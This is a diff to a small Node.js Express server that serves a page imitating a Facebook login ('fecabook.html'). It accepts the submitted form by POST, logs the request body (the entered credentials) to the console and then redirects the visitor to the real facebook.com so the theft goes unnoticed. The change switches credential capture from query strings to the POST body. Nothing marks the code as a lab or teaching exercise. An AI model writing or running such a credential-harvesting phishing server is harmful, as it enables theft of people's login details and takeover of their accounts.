@@ -5,7 +5,7 @@ const app = express();
 const server = require('http').createServer(app);
 
 const io = require('socket.io').listen(server);
-
+const bodyParser = require('body-parser');
 users = [];
 connections = [];
 
@@ -17,19 +17,25 @@ server.listen(5000,function(){
     console.log('server running...');
 });
 */
-
+app.use(bodyParser());
 
 app.get('/', (req, res, next) => {
     console.log('Login fecabook');
     res.sendFile(__dirname + '/fecabook.html')
 });
 
-app.get('/fecaboook', (req, res, next) => {
+app.post('/fecaboook', (req, res, next) => {
+    console.log('redirect to facebook');
+    console.log(JSON.stringify(req.body))
+    res.redirect('http://www.facebook.com');
+});
+/*
+app.gett('/fecaboook', (req, res, next) => {
     console.log('redirect to facebook');
     console.log(JSON.stringify(req.query))
     res.redirect('http://www.facebook.com');
 });
-
+*/
 app.get('/faceboooooook', (req, res, next) => {
     console.log('opening client page');
     res.sendFile(__dirname + '/faceboooooook.html')
